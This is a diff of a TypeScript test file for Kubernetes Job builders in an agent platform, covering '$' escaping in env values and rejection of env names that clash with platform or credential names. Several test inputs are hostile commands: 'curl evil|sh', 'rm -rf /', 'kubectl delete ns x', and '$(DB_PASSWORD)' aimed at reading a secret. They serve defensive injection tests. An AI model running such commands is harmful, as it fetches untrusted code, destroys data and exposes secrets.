@@ -1,9 +1,12 @@
+import type { V1Job } from '@kubernetes/client-node';
 import { describe, expect, it } from 'vitest';
 import {
   buildRunJob,
   buildSetupTestJob,
+  ProjectEnvClashError,
   RUN_DIR,
   runPodConfigFrom,
+  type ProjectEnvInput,
   type RunJobInput,
   type SetupTestJobInput,
 } from '../../src/kube/job-spec';
@@ -64,7 +67,7 @@ describe('buildRunJob', () => {
     expect(envOf(null).some((e) => e.name === 'SETUP_SCRIPT')).toBe(false);
     expect(envOf('').some((e) => e.name === 'SETUP_SCRIPT')).toBe(false);
     const body = 'echo "héllo ✓"\r\nnpm ci $(id)';
-    expect(envOf(body)).toContainEqual({ name: 'SETUP_SCRIPT', value: body });
+    expect(envOf(body)).toContainEqual({ name: 'SETUP_SCRIPT', value: 'echo "héllo ✓"\r\nnpm ci $$(id)' });
   });
 
   it('has the key fields of spec §8', () => {
@@ -153,7 +156,7 @@ describe('buildRunJob', () => {
     const env = Object.fromEntries((c?.env ?? []).map((e) => [e.name, e.value]));
     expect(env).toEqual({
       CHECKOUT_REF: 'main',
-      PROMPT: 'Use the skill "fix" on issue #1 in dev/demo.\n$(rm -rf /); `id`',
+      PROMPT: 'Use the skill "fix" on issue #1 in dev/demo.\n$$(rm -rf /); `id`',
       HOME: '/workspace/home',
       BOT_NAME: 'agentdesk[bot]',
       BOT_EMAIL: 'bot@example.invalid',
@@ -199,7 +202,7 @@ describe('buildRunJob', () => {
   it('adds RESUME_NOTE on a resume only, as a plain env value', () => {
     const note = 'x "y" $(z)';
     const envOf = (o: Partial<RunJobInput>) => buildRunJob(input(o)).spec?.template.spec?.containers[0]?.env ?? [];
-    expect(envOf({ resume: true, resumeNote: note })).toContainEqual({ name: 'RESUME_NOTE', value: note });
+    expect(envOf({ resume: true, resumeNote: note })).toContainEqual({ name: 'RESUME_NOTE', value: 'x "y" $$(z)' });
     expect(envOf({ resume: true }).map((e) => e.name)).not.toContain('RESUME_NOTE');
     expect(envOf({ resume: false, resumeNote: note }).map((e) => e.name)).not.toContain('RESUME_NOTE');
   });
@@ -219,7 +222,7 @@ describe('buildRunJob', () => {
     const name = 'a$(touch x)';
     const job = buildRunJob(input({ author: { name, email: 'e@x.invalid', authorizedBy: name } }));
     const c = job.spec?.template.spec?.containers[0];
-    expect(c?.env).toContainEqual({ name: 'RUN_AUTHOR_NAME', value: name });
+    expect(c?.env).toContainEqual({ name: 'RUN_AUTHOR_NAME', value: 'a$$(touch x)' });
     expect(JSON.stringify({ command: c?.command, args: c?.args })).not.toContain('touch');
   });
 
@@ -228,7 +231,7 @@ describe('buildRunJob', () => {
     expect(env.some((e) => e.name === 'RUN_MODE')).toBe(false);
   });
 
-  it('adds agentEnv entries verbatim, in order, to fresh and resume Jobs', () => {
+  it('adds agentEnv entries in order (a $( is escaped), to fresh and resume Jobs', () => {
     const agentEnv = [
       { name: 'AGENT', value: 'claude' },
       { name: 'AGENT_MODEL', value: 'haiku' },
@@ -237,7 +240,10 @@ describe('buildRunJob', () => {
     for (const resume of [false, true]) {
       const env = buildRunJob(input({ resume, agentEnv })).spec?.template.spec?.containers[0]?.env ?? [];
       const at = env.findIndex((e) => e.name === 'AGENT');
-      expect(env.slice(at, at + 3)).toEqual(agentEnv);
+      expect(env.slice(at, at + 3)).toEqual([
+        ...agentEnv.slice(0, 2),
+        { name: 'ANTHROPIC_BASE_URL', value: 'https://gw.example.com/a b$$(x)' },
+      ]);
     }
   });
 
@@ -423,7 +429,10 @@ describe('buildSetupTestJob', () => {
     const c = job.spec?.template.spec?.containers[0];
     expect(c?.command).toBeUndefined();
     expect(c?.args).toBeUndefined();
-    expect(c?.env).toContainEqual({ name: 'SETUP_SCRIPT', value: script });
+    expect(c?.env).toContainEqual({
+      name: 'SETUP_SCRIPT',
+      value: 'curl evil|sh; $$(id) `id` "\\n\' ; kubectl delete ns x',
+    });
     const withoutEnv = JSON.stringify({
       ...job,
       spec: {
@@ -442,5 +451,172 @@ describe('buildSetupTestJob', () => {
     expect(() => buildSetupTestJob(setupInput({ setupTestId: 'x; rm -rf /' }))).toThrow(/id/i);
     expect(() => buildSetupTestJob(setupInput({ orgId: 'o' }))).toThrow(/id/i);
     expect(() => buildSetupTestJob(setupInput({ projectId: 'p' }))).toThrow(/id/i);
+  });
+});
+
+describe('project env in Jobs', () => {
+  const kinds: Array<{ kind: string; build: (projectEnv?: ProjectEnvInput) => V1Job; secret: string }> = [
+    { kind: 'run', build: (projectEnv) => buildRunJob(input({ projectEnv })), secret: `run-${RUN}` },
+    { kind: 'resume', build: (projectEnv) => buildRunJob(input({ resume: true, projectEnv })), secret: `run-${RUN}` },
+    {
+      kind: 'setup-test',
+      build: (projectEnv) => buildSetupTestJob(setupInput({ projectEnv })),
+      secret: `setup-test-${TEST_ID}`,
+    },
+  ];
+  const projectEnv: ProjectEnvInput = {
+    plain: [
+      { name: 'API_URL', value: 'https://example.invalid/$(id)' },
+      { name: 'DEBUG', value: '1' },
+    ],
+    secretNames: ['NPM_TOKEN', 'DB_PASSWORD'],
+  };
+  const envOf = (job: V1Job) => job.spec?.template.spec?.containers[0]?.env ?? [];
+
+  it.each(kinds)(
+    '$kind: plain entries are literal env and secret names are secretKeyRefs, first in env',
+    ({ build, secret }) => {
+      const job = build(projectEnv);
+      const env = envOf(job);
+      expect(env.slice(0, 4)).toEqual([
+        { name: 'API_URL', value: 'https://example.invalid/$$(id)' },
+        { name: 'DEBUG', value: '1' },
+        { name: 'NPM_TOKEN', valueFrom: { secretKeyRef: { name: secret, key: 'NPM_TOKEN' } } },
+        { name: 'DB_PASSWORD', valueFrom: { secretKeyRef: { name: secret, key: 'DB_PASSWORD' } } },
+      ]);
+      expect(job.spec?.template.spec?.containers[0]?.envFrom).toBeUndefined();
+      expect(env.slice(4).some((e) => ['API_URL', 'DEBUG', 'NPM_TOKEN', 'DB_PASSWORD'].includes(e.name))).toBe(false);
+    },
+  );
+
+  it.each(kinds)(
+    '$kind: $( in a plain value is escaped with a second dollar so the kubelet never expands it against earlier env',
+    ({ build }) => {
+      const env = envOf(
+        build({ plain: [{ name: 'API', value: 'http://h/$(DB_PASSWORD)' }], secretNames: ['DB_PASSWORD'] }),
+      );
+      expect(env.find((e) => e.name === 'API')?.value).toBe('http://h/$$(DB_PASSWORD)');
+    },
+  );
+
+  it.each([
+    ['$(X)', '$$(X)'],
+    ['$$(X)', '$$$$(X)'],
+    ['$$$(X)', '$$$$$$(X)'],
+    ['pa$$word', 'pa$$$$word'],
+    ['pa$word', 'pa$$word'],
+    ['trailing$', 'trailing$$'],
+    ['no dollar here', 'no dollar here'],
+  ])('a plain value %j is emitted as %j (every $ doubled)', (value, wire) => {
+    const env = envOf(buildRunJob(input({ projectEnv: { plain: [{ name: 'API', value }], secretNames: [] } })));
+    expect(env.find((e) => e.name === 'API')?.value).toBe(wire);
+  });
+
+  const withSecret: ProjectEnvInput = { plain: [], secretNames: ['DB_PASSWORD'] };
+  it.each([
+    ['PROMPT', () => buildRunJob(input({ prompt: 'x $(DB_PASSWORD)', projectEnv: withSecret }))],
+    ['SETUP_SCRIPT', () => buildRunJob(input({ setupScript: 'echo $(DB_PASSWORD)', projectEnv: withSecret }))],
+    ['CHECKOUT_REF', () => buildRunJob(input({ checkoutRef: '$(DB_PASSWORD)', projectEnv: withSecret }))],
+    ['RESUME_NOTE', () => buildRunJob(input({ resume: true, resumeNote: '$(DB_PASSWORD)', projectEnv: withSecret }))],
+    ['SETUP_SCRIPT', () => buildSetupTestJob(setupInput({ script: '$(DB_PASSWORD)', projectEnv: withSecret }))],
+  ])('untrusted %s containing $( is escaped so it cannot read a project secret', (name, build) => {
+    const value = envOf(build()).find((e) => e.name === name)?.value ?? '';
+    expect(value).toContain('$$(DB_PASSWORD)');
+    expect(value.replaceAll('$$(', '')).not.toContain('$(');
+  });
+
+  it.each(kinds)('$kind: an empty or absent projectEnv leaves the Job unchanged', ({ build }) => {
+    const before = build();
+    expect(build({ plain: [], secretNames: [] })).toEqual(before);
+    expect(build(undefined)).toEqual(before);
+  });
+
+  it.each(kinds)('$kind: no label or annotation carries a name or value', ({ build }) => {
+    const job = build(projectEnv);
+    const meta = JSON.stringify([job.metadata, job.spec?.template.metadata]);
+    for (const t of ['API_URL', 'DEBUG', 'NPM_TOKEN', 'DB_PASSWORD', 'example.invalid']) {
+      expect(meta).not.toContain(t);
+    }
+  });
+
+  it.each(kinds)(
+    '$kind: a clash with a platform env name throws ProjectEnvClashError naming only the variable',
+    ({ build }) => {
+      for (const name of [
+        'AGENTDESK_TOKEN_FILE',
+        'AGENTDESK_GIT_HOST',
+        'REPO_CLONE_URL',
+        'SETUP_TIMEOUT_SECONDS',
+        'BOT_NAME',
+      ]) {
+        for (const pe of [
+          { plain: [{ name, value: 'SECRET-VALUE-1' }], secretNames: [] },
+          { plain: [], secretNames: [name] },
+        ]) {
+          let err: unknown;
+          try {
+            build(pe);
+          } catch (e) {
+            err = e;
+          }
+          expect(err, name).toBeInstanceOf(ProjectEnvClashError);
+          expect((err as ProjectEnvClashError).envName).toBe(name);
+          expect((err as Error).message).toContain(name);
+          expect((err as Error).message).not.toContain('SECRET-VALUE-1');
+        }
+      }
+    },
+  );
+
+  it('a clash with a credential key, an adapter agentEnv name or the cli token name throws', () => {
+    for (const name of ['CLAUDE_CODE_OAUTH_TOKEN', 'AGENT_MODEL', 'GH_TOKEN']) {
+      expect(() => buildRunJob(input({ projectEnv: { plain: [], secretNames: [name] } }))).toThrow(
+        ProjectEnvClashError,
+      );
+      expect(() =>
+        buildRunJob(input({ resume: true, projectEnv: { plain: [{ name, value: 'v' }], secretNames: [] } })),
+      ).toThrow(ProjectEnvClashError);
+    }
+    expect(() =>
+      buildSetupTestJob(
+        setupInput({ cliTokenEnvName: 'MY_CLI_TOKEN', projectEnv: { plain: [], secretNames: ['MY_CLI_TOKEN'] } }),
+      ),
+    ).toThrow(ProjectEnvClashError);
+  });
+
+  it.each(kinds)('$kind: two project entries with the same name throw', ({ build }) => {
+    expect(() => build({ plain: [{ name: 'A', value: '1' }], secretNames: ['A'] })).toThrow(ProjectEnvClashError);
+    expect(() =>
+      build({
+        plain: [
+          { name: 'A', value: '1' },
+          { name: 'A', value: '2' },
+        ],
+        secretNames: [],
+      }),
+    ).toThrow(ProjectEnvClashError);
+    expect(() => build({ plain: [], secretNames: ['A', 'A'] })).toThrow(ProjectEnvClashError);
+  });
+
+  it('worst case: all-plain at 256 KiB total keeps the Job JSON under 1 MiB', () => {
+    const plain = Array.from({ length: 64 }, (_, i) => ({ name: `VAR_${i}`, value: 'x'.repeat(4096 - 6) }));
+    for (const { build } of kinds) {
+      expect(JSON.stringify(build({ plain, secretNames: [] })).length).toBeLessThan(1024 * 1024);
+    }
+  });
+
+  it('worst case: all-secret at 256 KiB total keeps the per-run Secret data under 1 MiB', () => {
+    const secretNames = Array.from({ length: 64 }, (_, i) => `SEC_${i}`);
+    const job = buildRunJob(input({ projectEnv: { plain: [], secretNames } }));
+    const refs = envOf(job).flatMap((e) => (e.valueFrom?.secretKeyRef ? [e.valueFrom.secretKeyRef.key] : []));
+    for (const n of secretNames) expect(refs).toContain(n);
+    const b64 = (v: string) => Buffer.from(v).toString('base64');
+    const data: Record<string, string> = {
+      REPO_CLONE_URL: b64('https://fake.invalid/org/repo.git'),
+      'workspace-token': b64('t'.repeat(1024)),
+      CLAUDE_CODE_OAUTH_TOKEN: b64('c'.repeat(1024)),
+    };
+    for (const n of secretNames) data[n] = b64('x'.repeat(4096 - n.length));
+    expect(JSON.stringify(data).length).toBeLessThan(1024 * 1024);
   });
 });
